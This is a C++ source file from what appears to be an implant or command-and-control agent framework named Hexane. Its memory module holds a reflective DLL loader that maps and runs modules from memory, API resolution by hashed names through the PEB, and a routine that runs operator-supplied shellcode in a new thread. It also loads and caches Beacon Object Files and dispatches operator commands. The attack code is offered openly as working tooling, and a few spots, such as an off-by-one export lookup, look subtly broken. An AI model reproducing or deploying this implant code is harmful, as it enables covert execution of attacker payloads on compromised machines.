#include <core/include/memory.hpp>

using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Objects;
using namespace Threads;
using namespace Commands;

namespace Memory {
    namespace Methods {

        UINT_PTR GetStackCookie() {
            HEXANE;

            UINT_PTR cookie = 0;
            if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                return 0;
            }

            return cookie;
        }

        PRESOURCE GetIntResource(HMODULE base, CONST INT rsrc_id) {
            HEXANE;

            HRSRC rsrc_info		= { };
            PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));

            x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
            x_assert(object->size       = ctx->utilapi.SizeofResource(base, rsrc_info));
            x_assert(object->rsrc_lock  = ctx->utilapi.LockResource(object->h_global));

        defer:
            return object;
        }

        PEXECUTABLE CreateImage(uint8 *data) {
            HEXANE;

            auto image = (EXECUTABLE*) Malloc(sizeof(_executable));

            image->buffer   = data;
            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(image->buffer) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
            image->symbols  = (PCOFF_SYMBOL) (B_PTR(image->buffer) + image->nt_head->FileHeader.PointerToSymbolTable);
            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            return image;
        }
    }

    namespace Context {

        BOOL ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
        	HEXANE;

            _hexane instance    = { };
            VOID *region        = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
                return false;
            }

            F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
            if (!instance.memapi.RtlAllocateHeap) {
                return false;
            }

            region = RVA(PBYTE, instance.base.address, &__instance);
            if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return false;
            }

            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
            MemSet(&instance, 0, sizeof(_hexane));
            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

            return true;
        }

        VOID ContextDestroy() {
            HEXANE;
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->memapi.RtlFreeHeap;
            auto heap = ctx->heap;

            // free bof executables
            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCOFF(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Modules {
	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(CONST uint32 hash) {
		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

		    for (auto next = head->Flink; next != head; next = next->Flink) {
			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			    const auto name = mod->BaseDllName;

			    wchar_t buffer[MAX_PATH] = { };

			    if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
				    return mod;
			    }
		    }

		    return nullptr;
	    }

	    FARPROC GetExportAddress(CONST VOID *base, CONST uint32 hash) {
		    FARPROC address = nullptr;

		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		    const auto exports = (PIMAGE_EXPORT_DIRECTORY) (
			    B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

		    if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
			    return address;
		    }

		    for (auto index = 0; index < exports->NumberOfNames; index++) {
			    const auto name = (char *) (base + ((uint32_t *) (base + exports->AddressOfNames))[index - 1]);

			    char buffer[MAX_PATH] = {};

			    if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
				    address = (FARPROC) (base + ((uint32_t *) (base + exports->AddressOfFunctions))[index]);
				    break;
			    }
		    }

		    return address;
	    }

	    BOOL FindModule(EXECUTABLE *module, WCHAR *filename) {
	    	// TODO: everything loaded with this unit MUST RESIDE IN SYSTEM32
	    	HEXANE;

		    if (!filename) {
			    return false;
		    }

		    module->local_name		= filename;
		    module->cracked_name	= (PWCHAR) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, MAX_PATH * 2);

		    if (!module->cracked_name) {
			    return false;
		    }

		    CONST WCHAR *location = ctx->ioapi.PathFindFileNameW(filename);
		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);

		    return true;
	    }

	    BOOL ReadModule(EXECUTABLE *module) {
	    	HEXANE;

		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
		    if (handle == INVALID_HANDLE_VALUE) {
			    return false;
		    }

		    DWORD size = ctx->ioapi.GetFileSize(handle, nullptr);
		    if (size == INVALID_FILE_SIZE) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, (PSIZE_T) &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, (LPDWORD) &module->size, nullptr)) {
		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, &module->size, 0);
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    ctx->utilapi.NtClose(handle);
		    return true;
	    }

	    BOOL ResolveImports(const EXECUTABLE *module) {

		    PIMAGE_IMPORT_BY_NAME import_name		= nullptr;
		    PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc	= nullptr;
		    PIMAGE_THUNK_DATA first_thunk			= nullptr;
	    	PIMAGE_THUNK_DATA org_first				= nullptr;

		    IMAGE_DATA_DIRECTORY *data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

		    if (data_dire->Size) {
			    PIMAGE_IMPORT_DESCRIPTOR import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
		    	PIMAGE_IMPORT_DESCRIPTOR scan = import_desc;

			    DWORD count = 0;
			    for (; scan->Name; scan++) {
				    count++;
			    }

			    for (; import_desc->Name; import_desc++) {
			    	CHAR *name = (char *) module->base + import_desc->Name;
			    	HMODULE library = nullptr;

				    if (LDR_DATA_TABLE_ENTRY *entry = GetModuleEntry(HashStringA(name, MbsLength(name)))) {
			    		library = (HMODULE) entry->DllBase;
			    	}
				    else {
				    	wchar_t filename[MAX_PATH] = { };
				    	MbsToWcs(filename, name, MbsLength(name));

					    EXECUTABLE *new_load = LoadModule(LoadLocalFile, filename, nullptr, 0, nullptr);
				    	if (!new_load) {
				    		return false;
				    	}

				    	library = (HMODULE) new_load->base;
				    	// recurse^
				    }

				    first_thunk	= RVA(PIMAGE_THUNK_DATA, module->base, import_desc->FirstThunk);
				    org_first	= RVA(PIMAGE_THUNK_DATA, module->base, import_desc->OriginalFirstThunk);

				    for (; org_first->u1.Function; first_thunk++, org_first++) {
					    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
						    if (!LocalLdrGetProcedureAddress(library, NULL, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    } else {
						    import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);

						    FILL_STRING(aString, import_name->Name);
						    if (!LocalLdrGetProcedureAddress(library, &aString, 0, (void **) &first_thunk->u1.Function)) {
								return false;
						    }
					    }
				    }
			    }
		    }

		    // handle the delayed import table
		    data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

		    if (data_dire->Size) {
			    delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, module->base, data_dire->VirtualAddress);

			    for (; delay_desc->DllNameRVA; delay_desc++) {
				    // use LoadLibraryA for the time being.
				    // make this recursive in the future.
			    	// ^ good idea

				    HMODULE library = IsModulePresentA((char *) (module->base + delay_desc->DllNameRVA));
				    if (!library) {
					    library = pLoadLibraryA((LPSTR) (module->base + delay_desc->DllNameRVA));
				    }

				    first_thunk	= RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportAddressTableRVA);
				    org_first	= RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportNameTableRVA);

				    for (; org_first->u1.Function; first_thunk++, org_first++) {
					    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
						    if (!LocalLdrGetProcedureAddress(library, NULL, (WORD) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    } else {
						    import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);

						    FILL_STRING(aString, import_name->Name);
						    if (!LocalLdrGetProcedureAddress(library, &aString, 0, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    }
				    }
			    }
		    }

		    return true;
	    }

	    BOOL MapSections(EXECUTABLE *module) {
		    HEXANE;

		    auto region_size		= (SIZE_T) module->nt_head->OptionalHeader.SizeOfImage;
		    const auto pre_base		= module->nt_head->OptionalHeader.ImageBase;

		    module->base = pre_base;

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
			    module->base != pre_base) {

			    module->base	= 0;
			    region_size		= module->nt_head->OptionalHeader.SizeOfImage;

			    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
				    return false;
			    }
		    }

		    for (auto i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
			    B_PTR(module->base)[i] = module->buffer[i];
		    }

		    for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
			    for (auto j = 0; j < module->section->SizeOfRawData; j++) {
				    (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
			    }
		    }

		    UINT_PTR base_offset = module->base - pre_base;
		    PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		    // if non-zero rva and relocdir exists...
		    if ((module->base - pre_base) && relocdir) {
			    PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

			    do {
				    PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY)reloc + 1;

				    do {
					    switch (head->Type) {
					    case IMAGE_REL_BASED_DIR64:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
					    case IMAGE_REL_BASED_HIGHLOW:	*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_offset; break;
					    case IMAGE_REL_BASED_HIGH:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
					    case IMAGE_REL_BASED_LOW:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
					    }
					    head++;
				    }
				    while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

				    reloc = (PIMAGE_BASE_RELOCATION)head;
			    }
			    while (reloc->VirtualAddress);
		    }

		    module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
		    return true;
	    }

	    PEXECUTABLE LoadModule(const uint32 load_type, wchar_t *filename, uint8 *memory, const uint32 mem_size, wchar_t *name) {
	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
	    	HEXANE;

		    auto module = (EXECUTABLE *) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
		    if (!module) {
			    return nullptr;
		    }

		    module->success	= false;
		    module->link	= true;

		    switch (LOWORD(load_type)) {
		    	case LoadLocalFile:
				    if (!FindModule(module, filename) || !ReadModule(module)) {
					    goto defer;
				    }
				    break;

			    case LoadMemory:
				    module->size			= mem_size;
				    module->buffer			= memory;
				    module->cracked_name	= name;
				    module->local_name		= name;

				    if (name == nullptr) {
					    goto defer;
				    }
				    break;

			    default:
				    break;
		    }

		    if (load_type & NoLink)
			    module->link = false;

		    if (name == nullptr) {
			    name = module->cracked_name;
		    }

	    	if ((load_type & LoadBof) != LoadBof) {
			    if (LDR_DATA_TABLE_ENTRY *check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
				    module->base	= (uintptr_t) check_module->DllBase;
				    module->success = true;

				    goto defer;
			    }
	    	}

	    	const auto image = Methods::CreateImage(module->buffer);
		    if (!ImageCheckArch(image)) {
		    	goto defer;
		    }

	    	// TODO: DestroyImage(module);
	    	Free(image);

		    // map the sections into memory
		    if (!MapSections(module) || !ResolveImports(module)) {
			    goto defer;
		    }

		    if (module->link) {
			    if (!LinkModule(module)) {
				    goto defer;
			    }
		    }

		    // trigger tls callbacks, set permissions and call the entry point
		    if (!BeginExecution(module)) {
			    goto defer;
		    }

		    module->success = true;

	    defer:
		    return module;
	    }


	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
		    return false;
	    }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser parser) {
            HEXANE;

            uintptr_t pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return true;
            }

            if (!(pointer = GetCommandAddress(cmd_id))) {
                // LOG ERROR
                return false;
            }

            const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return true;
        }

        BOOL ExecuteShellcode(CONST PARSER &parser) {
            HEXANE;

            void *base      = nullptr;
            void (*exec)()  = nullptr;

        	HANDLE handle	= nullptr;
            BOOL success	= true;

            size_t size = parser.length;

            if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            exec = (void(*)()) base;
            ntstatus = ctx->threadapi.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);

            MemSet(base, 0, size);

        defer:
            if (base) {
                ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            HEXANE;

            COFF_PARAMS *bof  = (_coff_params *) Malloc(sizeof(_coff_params));
            COFF_PARAMS *saved = nullptr;

            bof->entrypoint = UnpackString(&parser, (uint32 *) &bof->entrypoint_length);
            bof->data       = UnpackBytes(&parser, (uint32 *) &bof->data_size);
            bof->args       = UnpackBytes(&parser, (uint32 *) &bof->args_size);
            bof->b_cache    = UnpackByte(&parser);
            bof->bof_id		= UnpackUint32(&parser);
            bof->task_id    = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
            // TODO: test that bof data size being zero is a correct way to do this

            if (!bof->data_size) {
                saved = GetCOFF(bof->bof_id);

                bof->data      = saved->data;
                bof->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (void *) COFFThread, bof, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCOFF(bof);
            }

            // NOTE: keep original task_id after every run or update (?)
            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!bof->b_cache) {
                RemoveCOFF(bof->bof_id);
            }
        }
    }
}
